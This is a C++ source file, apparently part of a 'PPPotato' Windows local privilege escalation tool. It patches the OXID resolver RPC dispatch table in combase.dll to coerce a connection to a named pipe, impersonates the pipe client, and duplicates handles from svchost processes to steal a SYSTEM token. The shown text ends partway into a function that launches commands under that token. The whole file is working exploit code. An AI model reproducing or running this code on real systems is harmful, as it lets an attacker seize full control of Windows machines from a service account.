#include "ImpersonatePPPotatoContext.h"
#include <aclapi.h>

#ifndef NTSTATUS
typedef LONG NTSTATUS;
#endif

typedef NTSTATUS(WINAPI* fNtQuerySystemInformation)(
    ULONG SystemInformationClass,
    PVOID SystemInformation,
    ULONG SystemInformationLength,
    PULONG ReturnLength
    );

#define SystemProcessInformation 0x05
#define SystemExtendedHandleInformation 0x40
#define STATUS_INFO_LENGTH_MISMATCH 0xc0000004
#define STATUS_SUCCESS 0x00000000

typedef struct _UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} UNICODE_STRING, * PUNICODE_STRING;

typedef struct _SYSTEM_PROCESS_INFORMATION {
    ULONG NextEntryOffset;
    ULONG NumberOfThreads;
    LARGE_INTEGER WorkingSetPrivateSize;
    ULONG HardFaultCount;
    ULONG NumberOfThreadsHighWatermark;
    ULONGLONG CycleTime;
    LARGE_INTEGER CreateTime;
    LARGE_INTEGER UserTime;
    LARGE_INTEGER KernelTime;
    UNICODE_STRING ImageName;
    LONG BasePriority;
    HANDLE UniqueProcessId;
    HANDLE InheritedFromUniqueProcessId;
    ULONG HandleCount;
    ULONG SessionId;
    ULONG_PTR UniqueProcessKey;
    SIZE_T PeakVirtualSize;
    SIZE_T VirtualSize;
    ULONG PageFaultCount;
    SIZE_T PeakWorkingSetSize;
    SIZE_T WorkingSetSize;
    SIZE_T QuotaPeakPagedPoolUsage;
    SIZE_T QuotaPagedPoolUsage;
    SIZE_T QuotaPeakNonPagedPoolUsage;
    SIZE_T QuotaNonPagedPoolUsage;
    SIZE_T PagefileUsage;
    SIZE_T PeakPagefileUsage;
    SIZE_T PrivatePageCount;
    LARGE_INTEGER ReadOperationCount;
    LARGE_INTEGER WriteOperationCount;
    LARGE_INTEGER OtherOperationCount;
    LARGE_INTEGER ReadTransferCount;
    LARGE_INTEGER WriteTransferCount;
    LARGE_INTEGER OtherTransferCount;
} SYSTEM_PROCESS_INFORMATION, * PSYSTEM_PROCESS_INFORMATION;

typedef struct _SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX {
    PVOID Object;
    ULONG_PTR UniqueProcessId;
    ULONG_PTR HandleValue;
    ULONG GrantedAccess;
    USHORT CreatorBackTraceIndex;
    USHORT ObjectTypeIndex;
    ULONG HandleAttributes;
    ULONG Reserved;
} SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX, * PSYSTEM_HANDLE_TABLE_ENTRY_INFO_EX;

typedef struct _SYSTEM_HANDLE_INFORMATION_EX {
    ULONG_PTR NumberOfHandles;
    ULONG_PTR Reserved;
    SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX Handles[1];
} SYSTEM_HANDLE_INFORMATION_EX, * PSYSTEM_HANDLE_INFORMATION_EX;

typedef NTSTATUS(NTAPI* fNtQuerySystemInformationEx)(
    ULONG SystemInformationClass,
    PVOID SystemInformation,
    ULONG SystemInformationLength,
    PULONG ReturnLength
    );

static const GUID ORCB_RPC_GUID = {
    0x18f70770, 0x8e64, 0x11cf,
    { 0x9a, 0xf1, 0x00, 0x20, 0xaf, 0x6e, 0x72, 0xf4 }
};

namespace ImpersonatePPPotato {

ImpersonatePPPotatoContext* ImpersonatePPPotatoContext::s_pCurrentContext = nullptr;

ImpersonatePPPotatoContext::ImpersonatePPPotatoContext(std::wostream& consoleWriter, const std::wstring& pipeName)
    : m_ConsoleWriter(consoleWriter)
    , m_PipeName(pipeName)
    , m_CombaseModule(nullptr)
    , m_CombaseSize(0)
    , m_DispatchTablePtr(nullptr)
    , m_UseProtseqFunctionPtr(nullptr)
    , m_ProcString(nullptr)
    , m_OriginalDispatchFn(nullptr)
    , m_bHooked(FALSE)
    , m_bStarted(FALSE)
    , m_hPipe(INVALID_HANDLE_VALUE)
    , m_pPipeThread(nullptr)
    , m_hSystemToken(NULL)
    , m_ucParamCount(0)
{
    InitContext();

    if (m_CombaseModule == nullptr) {
        throw std::runtime_error("[-] No combase module found");
    }
    else if (m_DispatchTable.empty() || m_ProcString == nullptr || m_UseProtseqFunctionPtr == nullptr) {
        throw std::runtime_error("[-] Cannot find IDL structure");
    }
}

ImpersonatePPPotatoContext::~ImpersonatePPPotatoContext() {
    Stop();
    Restore();

    if (m_hSystemToken) {
        CloseHandle(m_hSystemToken);
    }
}

void ImpersonatePPPotatoContext::InitContext() {
    m_ConsoleWriter << L"[*] Initializing context..." << std::endl;

    m_CombaseModule = GetCombaseBase();
    if (!m_CombaseModule) {
        m_ConsoleWriter << L"[!] Failed to get combase.dll base address" << std::endl;
        return;
    }

    MODULEINFO modInfo = {};
    if (!GetModuleInfo((HMODULE)m_CombaseModule, &modInfo)) {
        throw std::runtime_error("[!] Failed to get module info");
        return;
    }
    m_CombaseSize = modInfo.SizeOfImage;

    void* rpcInterface = FindRpcInterface(m_CombaseModule, m_CombaseSize, &ORCB_RPC_GUID);
    if (!rpcInterface) {
        throw std::runtime_error("[!] Failed to find ORCB RPC interface");
        return;
    }

    RPC_SERVER_INTERFACE* pServerInterface = (RPC_SERVER_INTERFACE*)rpcInterface;
    RPC_DISPATCH_TABLE* pDispatchTable = (RPC_DISPATCH_TABLE*)pServerInterface->DispatchTable;
    MIDL_SERVER_INFO* pMidlServerInfo = (MIDL_SERVER_INFO*)pServerInterface->InterpreterInfo;

    m_DispatchTablePtr = (void*)pMidlServerInfo->DispatchTable;
    m_ProcString = (void*)pMidlServerInfo->ProcString;
    DWORD dispatchCount = pDispatchTable->DispatchTableCount;
    m_DispatchTable.resize(dispatchCount);
    m_FmtStringOffsetTable.resize(dispatchCount);

    for (DWORD i = 0; i < dispatchCount; i++) {
        m_DispatchTable[i] = ReadPtr((void*)pMidlServerInfo->DispatchTable, i * sizeof(void*));
    }

    for (DWORD i = 0; i < dispatchCount; i++) {
        m_FmtStringOffsetTable[i] = ReadInt16((void*)pMidlServerInfo->FmtStringOffset, i * sizeof(SHORT));
    }

    if (m_DispatchTable.empty()) {
        m_ConsoleWriter << L"[!] Dispatch table is empty" << std::endl;
        return;
    }

    m_UseProtseqFunctionPtr = m_DispatchTable[0];

    if (m_FmtStringOffsetTable.empty()) {
        m_ConsoleWriter << L"[!] Format string offset table is empty" << std::endl;
        return;
    }

    SHORT fmtOffset = m_FmtStringOffsetTable[0];
    m_ucParamCount = ReadByte(m_ProcString, fmtOffset + 19);
}

void ImpersonatePPPotatoContext::HookRPC() {
    if (m_bHooked) {
        m_ConsoleWriter << L"[!] RPC already hooked" << std::endl;
        return;
    }

    if (!m_DispatchTablePtr || !m_UseProtseqFunctionPtr) {
        m_ConsoleWriter << L"[!] Context not initialized" << std::endl;
        return;
    }

    void* hookFn = GetHookFunction(m_ucParamCount);
    if (!hookFn) {
        m_ConsoleWriter << L"[!] Failed to get hook function for param count: " << (int)m_ucParamCount << std::endl;
        return;
    }

    m_OriginalDispatchFn = m_UseProtseqFunctionPtr;

    DWORD oldProtect = 0;
    if (!VirtualProtect(m_DispatchTablePtr, sizeof(void*), PAGE_READWRITE, &oldProtect)) {
        m_ConsoleWriter << L"[!] VirtualProtect failed" << std::endl;
        return;
    }

    ((void**)m_DispatchTablePtr)[0] = hookFn;
    VirtualProtect(m_DispatchTablePtr, sizeof(void*), oldProtect, &oldProtect);

    m_bHooked = TRUE;
    m_ConsoleWriter << L"[*] HookRPC success" << std::endl;
}

void ImpersonatePPPotatoContext::Restore() {
    if (!m_bHooked) {
        return;
    }

    if (!m_DispatchTablePtr || !m_OriginalDispatchFn) {
        m_ConsoleWriter << L"[!] Cannot restore - not hooked or no original function" << std::endl;
        return;
    }

    DWORD oldProtect = 0;
    if (!VirtualProtect(m_DispatchTablePtr, sizeof(void*), PAGE_READWRITE, &oldProtect)) {
        m_ConsoleWriter << L"[!] VirtualProtect failed" << std::endl;
        return;
    }

    ((void**)m_DispatchTablePtr)[0] = m_OriginalDispatchFn;
    VirtualProtect(m_DispatchTablePtr, sizeof(void*), oldProtect, &oldProtect);

    m_bHooked = FALSE;
}

void ImpersonatePPPotatoContext::Start() {
    if (!m_bHooked || m_bStarted) {
        m_ConsoleWriter << L"[!] Must hook RPC before starting pipe server" << std::endl;
        return;
    }

    SetCurrentContext(this);

    m_pPipeThread = new std::thread(&ImpersonatePPPotatoContext::PipeServerThread, this);
    m_bStarted = TRUE;
    m_ConsoleWriter << L"[*] PipeServer started" << std::endl;
}

void ImpersonatePPPotatoContext::Stop() {
    if (!m_bStarted) {
        return;
    }

    if (m_pPipeThread) {
        if (m_pPipeThread->joinable()) {
            m_pPipeThread->join();
        }
        delete m_pPipeThread;
        m_pPipeThread = nullptr;
    }

    if (m_hPipe != INVALID_HANDLE_VALUE) {
        CloseHandle(m_hPipe);
        m_hPipe = INVALID_HANDLE_VALUE;
    }

    m_bStarted = FALSE;
}

void ImpersonatePPPotatoContext::PipeServerThread() {
    std::wstring fullPipeName = L"\\\\.\\pipe\\" + m_PipeName + L"\\pipe\\epmapper";

    m_ConsoleWriter << L"[*] CreateNamedPipe " << fullPipeName << std::endl;

    PSECURITY_DESCRIPTOR pSecDesc = nullptr;
    ULONG ulSize = 0;
    if (!CreatePipeSecurity(&pSecDesc, &ulSize)) {
        m_ConsoleWriter << L"[!] Failed to create pipe security" << std::endl;
        return;
    }

    SECURITY_ATTRIBUTES sa = {};
    sa.nLength = sizeof(sa);
    sa.lpSecurityDescriptor = pSecDesc;
    sa.bInheritHandle = FALSE;

    m_hPipe = CreateNamedPipeW(
        fullPipeName.c_str(),
        PIPE_ACCESS_DUPLEX,
        PIPE_TYPE_BYTE | PIPE_READMODE_BYTE | PIPE_WAIT,
        PIPE_UNLIMITED_INSTANCES,
        521,
        0,
        123,
        &sa
    );

    LocalFree(pSecDesc);

    if (m_hPipe == INVALID_HANDLE_VALUE) {
        m_ConsoleWriter << L"[!] CreateNamedPipe failed: " << GetLastError() << std::endl;
        return;
    }

    m_ConsoleWriter << L"[*] Waiting for pipe connection..." << std::endl;

    if (!ConnectNamedPipe(m_hPipe, NULL)) {
        DWORD dwError = GetLastError();
        if (dwError != ERROR_PIPE_CONNECTED) {
            m_ConsoleWriter << L"[!] ConnectNamedPipe failed: " << dwError << std::endl;
            CloseHandle(m_hPipe);
            m_hPipe = INVALID_HANDLE_VALUE;
            return;
        }
    }

    m_ConsoleWriter << L"[*] Pipe Connected!" << std::endl;

    if (!ImpersonateNamedPipeClient(m_hPipe)) {
        m_ConsoleWriter << L"[!] ImpersonateNamedPipeClient failed: " << GetLastError() << std::endl;
        DisconnectNamedPipe(m_hPipe);
        CloseHandle(m_hPipe);
        m_hPipe = INVALID_HANDLE_VALUE;
        return;
    }

    HANDLE hCurrentToken = NULL;
    if (OpenThreadToken(GetCurrentThread(), TOKEN_QUERY, FALSE, &hCurrentToken)) {
        std::wstring userName = GetTokenUserName(hCurrentToken);
        if (!userName.empty()) {
            m_ConsoleWriter << L"[*] CurrentUser: " << userName << std::endl;
        }
        CloseHandle(hCurrentToken);
    }

    m_ConsoleWriter << L"[*] Start Search System Token" << std::endl;

    std::vector<ProcessTokenInfo> systemTokens;
    if (GetProcessTokensWithIntegrity(systemTokens, -1)) {
        if (!systemTokens.empty()) {
            m_hSystemToken = systemTokens[0].TokenHandle;
            m_ConsoleWriter << L"[*] PID: " << systemTokens[0].TargetProcessId
                           << L" Token:0x" << std::hex << systemTokens[0].TargetProcessToken
                           << L" User: " << systemTokens[0].UserName << std::endl;

            for (size_t i = 1; i < systemTokens.size(); i++) {
                CloseProcessTokenInfo(systemTokens[i]);
            }
        }
        else {
            m_ConsoleWriter << L"[-] systemTokens Empty\n" << std::endl;
        }
    }
    else {
        m_ConsoleWriter << L"[-] Error in GetProcessTokensWithIntegrity\n" << std::endl;
    }

    //RevertToSelf();

    m_ConsoleWriter << L"[*] Find System Token : " << (m_hSystemToken ? L"TRUE" : L"FALSE") << std::endl;

    DisconnectNamedPipe(m_hPipe);
    CloseHandle(m_hPipe);
    m_hPipe = INVALID_HANDLE_VALUE;
}

void* ImpersonatePPPotatoContext::GetHookFunction(BYTE ucParamCount) {
    switch (ucParamCount) {
        case 4: return (void*)&HookDelegate<4>;
        case 5: return (void*)&HookDelegate<5>;
        case 6: return (void*)&HookDelegate<6>;
        case 7: return (void*)&HookDelegate<7>;
        case 8: return (void*)&HookDelegate<8>;
        case 9: return (void*)&HookDelegate<9>;
        case 10: return (void*)&HookDelegate<10>;
        case 11: return (void*)&HookDelegate<11>;
        case 12: return (void*)&HookDelegate<12>;
        case 13: return (void*)&HookDelegate<13>;
        case 14: return (void*)&HookDelegate<14>;
        default:
            m_ConsoleWriter << L"[!] Unsupported param count: " << (int)ucParamCount << std::endl;
            return nullptr;
    }
}

DWORD ImpersonatePPPotatoContext::HookProc(
    void* p0, void* p1, void* p2, void* p3, void* p4, void* p5, void* p6, void* p7,
    void* p8, void* p9, void* p10, void* p11, void* p12, void* p13)
{
    ImpersonatePPPotatoContext* ctx = GetCurrentContext();

    if (!ctx) {
        return 0;
    }

    void** ppdsaNewBindings = nullptr;
    void** ppdsaNewSecurity = nullptr;

    switch (ctx->m_ucParamCount) {
        case 4: ppdsaNewBindings = (void**)p2; ppdsaNewSecurity = (void**)p3; break;
        case 5: ppdsaNewBindings = (void**)p3; ppdsaNewSecurity = (void**)p4; break;
        case 6: ppdsaNewBindings = (void**)p4; ppdsaNewSecurity = (void**)p5; break;
        case 7: ppdsaNewBindings = (void**)p5; ppdsaNewSecurity = (void**)p6; break;
        case 8: ppdsaNewBindings = (void**)p6; ppdsaNewSecurity = (void**)p7; break;
        case 9: ppdsaNewBindings = (void**)p7; ppdsaNewSecurity = (void**)p8; break;
        case 10: ppdsaNewBindings = (void**)p8; ppdsaNewSecurity = (void**)p9; break;
        case 11: ppdsaNewBindings = (void**)p9; ppdsaNewSecurity = (void**)p10; break;
        case 12: ppdsaNewBindings = (void**)p10; ppdsaNewSecurity = (void**)p11; break;
        case 13: ppdsaNewBindings = (void**)p11; ppdsaNewSecurity = (void**)p12; break;
        case 14: ppdsaNewBindings = (void**)p12; ppdsaNewSecurity = (void**)p13; break;
        default:
            return 0;
    }

    std::wstring endpoint1 = L"ncacn_np:localhost/pipe/" + ctx->m_PipeName + L"[\\pipe\\epmapper]";
    std::wstring endpoint2 = L"ncacn_ip_tcp:Peace bro!";
    std::vector<std::wstring> endpoints = { endpoint1, endpoint2 };

    int entrieSize = 3;
    for (const auto& ep : endpoints) {
        entrieSize += ep.length();
        entrieSize++;
    }

    int memroySize = entrieSize * 2 + 10;
    void* pdsaNewBindings = LocalAlloc(LMEM_FIXED | LMEM_ZEROINIT, memroySize);
    if (!pdsaNewBindings) {
        return 0;
    }

    memset(pdsaNewBindings, 0, memroySize);

    int offset = 0;

    *(WORD*)((BYTE*)pdsaNewBindings + offset) = (WORD)entrieSize;
    offset += 2;
    *(WORD*)((BYTE*)pdsaNewBindings + offset) = (WORD)(entrieSize - 2);
    offset += 2;

    for (const auto& ep : endpoints) {
        for (size_t j = 0; j < ep.length(); j++) {
            *(WCHAR*)((BYTE*)pdsaNewBindings + offset) = ep[j];
            offset += 2;
        }
        offset += 2;
    }

    if (ppdsaNewBindings) {
        *ppdsaNewBindings = pdsaNewBindings;
    }

    return 0;
}

BOOL ImpersonatePPPotatoContext::CreatePipeSecurity(
    PSECURITY_DESCRIPTOR* ppSecurityDescriptor,
    PULONG pSecurityDescriptorSize)
{
    *ppSecurityDescriptor = nullptr;
    *pSecurityDescriptorSize = 0;

    PSECURITY_DESCRIPTOR pSD = nullptr;
    ULONG ulSize = 0;

    ConvertStringSecurityDescriptorToSecurityDescriptor(
        "D:(A;OICI;GA;;;WD)",
        SDDL_REVISION_1,
        &pSD,
        &ulSize
    );

    if (!pSD) {
        return FALSE;
    }

    *ppSecurityDescriptor = pSD;
    *pSecurityDescriptorSize = ulSize;
    return TRUE;
}

void* ImpersonatePPPotatoContext::ReadPtr(void* ptr, SIZE_T offset) {
    return ((void**)ptr)[offset / sizeof(void*)];
}

SHORT ImpersonatePPPotatoContext::ReadInt16(void* ptr, SIZE_T offset) {
    return ((SHORT*)ptr)[offset / sizeof(SHORT)];
}

BYTE ImpersonatePPPotatoContext::ReadByte(void* ptr, SIZE_T offset) {
    return ((BYTE*)ptr)[offset];
}

int ImpersonatePPPotatoContext::SundaySearch(
    const BYTE* text, int textLen,
    const BYTE* pattern, int patternLen)
{
    int delta[256];

    for (int j = 0; j < 256; j++) {
        delta[j] = patternLen + 1;
    }
    for (int j = 0; j < patternLen; j++) {
        delta[pattern[j]] = patternLen - j;
    }

    int i = 0;
    while (i <= textLen - patternLen) {
        int j = 0;
        while (j < patternLen && text[i + j] == pattern[j]) {
            j++;
        }
        if (j == patternLen) {
            return i;
        }
        if (i + patternLen < textLen) {
            i += delta[text[i + patternLen]];
        }
        else {
            break;
        }
    }
    return -1;
}

void* ImpersonatePPPotatoContext::FindRpcInterface(
    void* combaseBase,
    SIZE_T combaseSize,
    const GUID* pGuid)
{
    BYTE* dllContent = (BYTE*)combaseBase;
    BYTE searchPattern[256];
    memset(searchPattern, 0, sizeof(searchPattern));

    UINT32 structSize = sizeof(RPC_SERVER_INTERFACE);
    memcpy(searchPattern, &structSize, sizeof(UINT32));
    memcpy(searchPattern + sizeof(UINT32), pGuid, sizeof(GUID));

    int offset = SundaySearch(dllContent, (int)combaseSize, searchPattern, sizeof(UINT32) + sizeof(GUID));
    if (offset < 0) {
        return nullptr;
    }

    return (void*)((BYTE*)combaseBase + offset);
}

void* ImpersonatePPPotatoContext::GetCombaseBase() {
    HMODULE hMods[1024];
    DWORD cbNeeded = 0;

    if (EnumProcessModules(GetCurrentProcess(), hMods, sizeof(hMods), &cbNeeded)) {
        for (DWORD i = 0; i < (cbNeeded / sizeof(HMODULE)); i++) {
            WCHAR szModName[MAX_PATH];
            if (GetModuleBaseNameW(GetCurrentProcess(), hMods[i], szModName, sizeof(szModName) / sizeof(WCHAR))) {
                if (_wcsicmp(szModName, L"combase.dll") == 0) {
                    return hMods[i];
                }
            }
        }
    }
    return nullptr;
}

BOOL ImpersonatePPPotatoContext::GetModuleInfo(HMODULE hModule, MODULEINFO* pModuleInfo) {
    return GetModuleInformation(GetCurrentProcess(), hModule, pModuleInfo, sizeof(MODULEINFO));
}
BOOL ImpersonatePPPotatoContext::EnablePrivilege(LPCWSTR PrivilegeName) {
    HANDLE hToken;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
        return FALSE;
    }

    LUID luid;
    if (!LookupPrivilegeValueW(NULL, PrivilegeName, &luid)) {
        CloseHandle(hToken);
        return FALSE;
    }

    TOKEN_PRIVILEGES tp;
    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    BOOL bResult = AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL);

    CloseHandle(hToken);
    return bResult;
}

BOOL ImpersonatePPPotatoContext::IsSystemToken(HANDLE TokenHandle) {
    BYTE tokenInfo[1024];
    DWORD dwLength = 0;
    PTOKEN_USER pTokenUser = (PTOKEN_USER)tokenInfo;

    if (!GetTokenInformation(TokenHandle, TokenUser, pTokenUser, sizeof(tokenInfo), &dwLength)) {
        return FALSE;
    }

    SID_IDENTIFIER_AUTHORITY sia = SECURITY_NT_AUTHORITY;
    PSID pSystemSid = nullptr;
    if (!AllocateAndInitializeSid(&sia, 1, SECURITY_LOCAL_SYSTEM_RID, 0, 0, 0, 0, 0, 0, 0, &pSystemSid)) {
        return FALSE;
    }

    BOOL isSystem = EqualSid(pTokenUser->User.Sid, pSystemSid);
    FreeSid(pSystemSid);
    return isSystem;
}

DWORD ImpersonatePPPotatoContext::GetTokenIntegrityLevel(HANDLE hToken) {
    DWORD dwLen = 0;
    TOKEN_MANDATORY_LABEL* pTml = nullptr;
    DWORD integrityLevel = 0;

    if (GetTokenInformation(hToken, TokenIntegrityLevel, nullptr, 0, &dwLen)) {
        return 0;
    }

    pTml = (TOKEN_MANDATORY_LABEL*)malloc(dwLen);
    if (!pTml) return 0;

    if (GetTokenInformation(hToken, TokenIntegrityLevel, pTml, dwLen, &dwLen)) {
        DWORD* pSid = (DWORD*)GetSidSubAuthority(pTml->Label.Sid, 0);
        if (pSid) {
            integrityLevel = *pSid;
        }
    }

    free(pTml);
    return integrityLevel;
}

DWORD ImpersonatePPPotatoContext::GetTokenImpersonationLevel(HANDLE hToken) {
    DWORD dwLen = 0;
    GetTokenInformation(hToken, TokenImpersonationLevel, nullptr, 0, &dwLen);

    if (GetLastError() == ERROR_INSUFFICIENT_BUFFER && dwLen > 0) {
        // Impersonation token - get the actual level
        SECURITY_IMPERSONATION_LEVEL* pLevel = (SECURITY_IMPERSONATION_LEVEL*)malloc(dwLen);
        if (!pLevel) return SecurityAnonymous;

        if (GetTokenInformation(hToken, TokenImpersonationLevel, pLevel, dwLen, &dwLen)) {
            DWORD level = *pLevel;
            free(pLevel);
            return level;
        }
        free(pLevel);
        return SecurityAnonymous;
    }

    // Primary token - these can be used for process creation
    return SecurityImpersonation;
}

std::wstring ImpersonatePPPotatoContext::GetTokenUserName(HANDLE hToken) {
    std::wstring result;
    DWORD dwLen = 0;

    GetTokenInformation(hToken, TokenUser, nullptr, 0, &dwLen);
    if (dwLen == 0) return result;

    TOKEN_USER* pUser = (TOKEN_USER*)malloc(dwLen);
    if (!pUser) return result;

    if (GetTokenInformation(hToken, TokenUser, pUser, dwLen, &dwLen)) {
        WCHAR szName[256] = { 0 };
        WCHAR szDomain[256] = { 0 };
        DWORD dwNameLen = 256;
        DWORD dwDomainLen = 256;
        SID_NAME_USE snu;

        if (LookupAccountSidW(nullptr, pUser->User.Sid, szName, &dwNameLen,
            szDomain, &dwDomainLen, &snu)) {
            result = std::wstring(szDomain) + L"\\" + std::wstring(szName);
        }
    }

    free(pUser);
    return result;
}

std::vector<DWORD> GetSvchostPids() {
    std::vector<DWORD> svchostPids;
    HMODULE hNtDll = GetModuleHandleW(L"ntdll.dll");
    if (!hNtDll) return svchostPids;

    fNtQuerySystemInformation NtQuerySystemInformation =
        (fNtQuerySystemInformation)GetProcAddress(hNtDll, "NtQuerySystemInformation");
    if (!NtQuerySystemInformation) return svchostPids;

    ULONG bufferSize = 1024 * 1024;
    PVOID pBuffer = VirtualAlloc(NULL, bufferSize, MEM_COMMIT, PAGE_READWRITE);
    ULONG returnLength = 0;

    while (NtQuerySystemInformation(SystemProcessInformation, pBuffer, bufferSize, &returnLength) == STATUS_INFO_LENGTH_MISMATCH) {
        VirtualFree(pBuffer, 0, MEM_RELEASE);
        bufferSize *= 2;
        pBuffer = VirtualAlloc(NULL, bufferSize, MEM_COMMIT, PAGE_READWRITE);
    }

    PSYSTEM_PROCESS_INFORMATION pProcessInfo = (PSYSTEM_PROCESS_INFORMATION)pBuffer;
    while (true) {
        if (pProcessInfo->ImageName.Buffer != NULL) {
            std::wstring processName(pProcessInfo->ImageName.Buffer, pProcessInfo->ImageName.Length / sizeof(WCHAR));
            for (auto& c : processName) c = towlower(c);
            if (processName == L"svchost.exe") {
                svchostPids.push_back((DWORD)(ULONG_PTR)pProcessInfo->UniqueProcessId);
            }
        }
        if (pProcessInfo->NextEntryOffset == 0) break;
        pProcessInfo = (PSYSTEM_PROCESS_INFORMATION)((PBYTE)pProcessInfo + pProcessInfo->NextEntryOffset);
    }

    VirtualFree(pBuffer, 0, MEM_RELEASE);
    return svchostPids;
}

USHORT GetTokenTypeIndex(fNtQuerySystemInformation NtQuery) {
    HANDLE hToken = NULL;

    if (!OpenThreadToken(GetCurrentThread(), TOKEN_QUERY, TRUE, &hToken)) {
        if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
            std::wcout << L"[-] ERROR: The local test token could not be opened. GetLastError: " << GetLastError() << std::endl;
            return 0;
        }
    }

    ULONG bufferSize = 1024 * 1024;
    PVOID pBuffer = VirtualAlloc(NULL, bufferSize, MEM_COMMIT, PAGE_READWRITE);
    ULONG returnLength = 0;
    NTSTATUS status;

    while ((status = NtQuery(SystemExtendedHandleInformation, pBuffer, bufferSize, &returnLength)) == STATUS_INFO_LENGTH_MISMATCH) {
        VirtualFree(pBuffer, 0, MEM_RELEASE);
        bufferSize *= 2;
        pBuffer = VirtualAlloc(NULL, bufferSize, MEM_COMMIT, PAGE_READWRITE);
    }

    if (status != STATUS_SUCCESS) {
        std::wcout << L"[-] ERROR: NtQuerySystemInformation failed with STATUS: 0x" << std::hex << status << L" Size needed: " << std::dec << returnLength << std::endl;
        CloseHandle(hToken);
        VirtualFree(pBuffer, 0, MEM_RELEASE);
        return 0;
    }

    USHORT tokenTypeIndex = 0;
    PSYSTEM_HANDLE_INFORMATION_EX pHandleInfo = (PSYSTEM_HANDLE_INFORMATION_EX)pBuffer;

    for (ULONG_PTR i = 0; i < pHandleInfo->NumberOfHandles; i++) {
        SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX handleEntry = pHandleInfo->Handles[i];

        DWORD entryPid = (DWORD)handleEntry.UniqueProcessId;
        HANDLE entryHandle = (HANDLE)handleEntry.HandleValue;
        if (entryPid == GetCurrentProcessId()) {
            if (entryHandle == hToken) {
                tokenTypeIndex = handleEntry.ObjectTypeIndex;
                break;
            }
        }
    }

    if (tokenTypeIndex == 0) {
        std::wcout << L"[-] ERROR: No usable tokens have been found" << std::endl;
    }

    CloseHandle(hToken);
    VirtualFree(pBuffer, 0, MEM_RELEASE);

    return tokenTypeIndex;
}

BOOL ImpersonatePPPotatoContext::GetProcessTokensWithIntegrity(
    std::vector<ProcessTokenInfo>& tokens,
    DWORD targetPid)
{
    tokens.clear();
    HMODULE hNtDll = GetModuleHandleW(L"ntdll.dll");
    fNtQuerySystemInformation NtQuerySystemInformation =
        (fNtQuerySystemInformation)GetProcAddress(hNtDll, "NtQuerySystemInformation");
    
    if (!NtQuerySystemInformation) return FALSE;

    USHORT tokenTypeIndex = GetTokenTypeIndex(NtQuerySystemInformation);
    if (tokenTypeIndex == 0) return FALSE;

    std::vector<DWORD> targetPids = GetSvchostPids();
    ULONG bufferSize = 1024 * 1024 * 2;
    PVOID pBuffer = VirtualAlloc(NULL, bufferSize, MEM_COMMIT, PAGE_READWRITE);
    ULONG returnLength = 0;

    while (NtQuerySystemInformation(SystemExtendedHandleInformation, pBuffer, bufferSize, &returnLength) == STATUS_INFO_LENGTH_MISMATCH) {
        VirtualFree(pBuffer, 0, MEM_RELEASE);
        bufferSize *= 2;
        pBuffer = VirtualAlloc(NULL, bufferSize, MEM_COMMIT, PAGE_READWRITE);
    }

    PSYSTEM_HANDLE_INFORMATION_EX pHandleInfo = (PSYSTEM_HANDLE_INFORMATION_EX)pBuffer;
    DWORD lastOpenedPid = 0;
    HANDLE hProcess = NULL;

    for (ULONG_PTR i = 0; i < pHandleInfo->NumberOfHandles; i++) {
        SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX handleEntry = pHandleInfo->Handles[i];

        if (handleEntry.ObjectTypeIndex != tokenTypeIndex) continue;
        if (handleEntry.GrantedAccess == 0x0012019f) continue;

        DWORD pid = (DWORD)handleEntry.UniqueProcessId;

        bool isTarget = false;
        if (targetPid != -1 && pid == targetPid) {
            isTarget = true;
        }
        else if (targetPid == -1) {
            for (DWORD svcPid : targetPids) {
                if (svcPid == pid) {
                    isTarget = true;
                    break;
                }
            }
        }

        if (!isTarget) continue;

        if (pid != lastOpenedPid) {
            if (hProcess) {
                CloseHandle(hProcess);
                hProcess = NULL;
            }
            hProcess = OpenProcess(PROCESS_DUP_HANDLE, FALSE, pid);
            lastOpenedPid = pid;
        }

        if (!hProcess) continue;

        HANDLE hDupToken = NULL;
        if (DuplicateHandle(hProcess, (HANDLE)handleEntry.HandleValue, GetCurrentProcess(), &hDupToken,
            TOKEN_DUPLICATE | TOKEN_QUERY | TOKEN_IMPERSONATE | TOKEN_ASSIGN_PRIMARY,
            FALSE, 0)) {

            if (IsSystemToken(hDupToken)) {
                DWORD integrityLevel = GetTokenIntegrityLevel(hDupToken);
                DWORD impersonationLevel = GetTokenImpersonationLevel(hDupToken);
                if (impersonationLevel >= SecurityImpersonation && integrityLevel >= 0x3000) {
                    ProcessTokenInfo info = {};
                    info.TokenHandle = hDupToken;
                    info.TargetProcessId = pid;
                    info.TargetProcessToken = (DWORD_PTR)handleEntry.HandleValue;
                    info.IntegrityLevel = integrityLevel;
                    info.ImpersonationLevel = impersonationLevel;
                    info.UserName = L"NT AUTHORITY\\SYSTEM";
                    tokens.push_back(info);
                    break;
                }
            }
            CloseHandle(hDupToken);
        }
    }

    if (hProcess) CloseHandle(hProcess);
    VirtualFree(pBuffer, 0, MEM_RELEASE);
    return !tokens.empty();
}

BOOL ImpersonatePPPotatoContext::CloseProcessTokenInfo(ProcessTokenInfo& tokenInfo) {
    if (tokenInfo.TokenHandle) {
        CloseHandle(tokenInfo.TokenHandle);
        tokenInfo.TokenHandle = nullptr;
    }
    return TRUE;
}

BOOL ImpersonatePPPotatoContext::CreateProcessWithToken(
    HANDLE hToken,
    LPCWSTR lpCommandLine,
    std::wstring* pOutput)
{
    if (!hToken || !lpCommandLine) {
        return FALSE;
    }

    EnablePrivilege((LPCWSTR)SE_IMPERSONATE_NAME);

    SECURITY_ATTRIBUTES sa = { sizeof(SECURITY_ATTRIBUTES), NULL, TRUE };

    HANDLE hStdOutRead = NULL;
    HANDLE hStdOutWrite = NULL;
    if (pOutput) {
        if (!CreatePipe(&hStdOutRead, &hStdOutWrite, &sa, 0)) {
            m_ConsoleWriter << std::dec << L"[!] CreatePipe failed: " << GetLastError() << std::endl;
            return FALSE;
        }
